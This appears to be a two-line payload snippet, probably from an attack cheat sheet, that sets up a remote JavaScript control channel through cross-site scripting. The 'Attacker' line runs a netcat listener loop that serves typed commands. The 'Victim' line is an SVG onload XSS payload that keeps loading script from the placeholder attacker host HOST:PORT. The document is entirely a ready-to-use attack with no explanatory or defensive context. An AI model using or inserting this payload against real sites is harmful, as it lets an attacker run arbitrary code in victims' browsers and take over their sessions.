```
Attacker: while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done
Victim: <svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//HOST:PORT";d.body.appendChild(z)},0)>
```
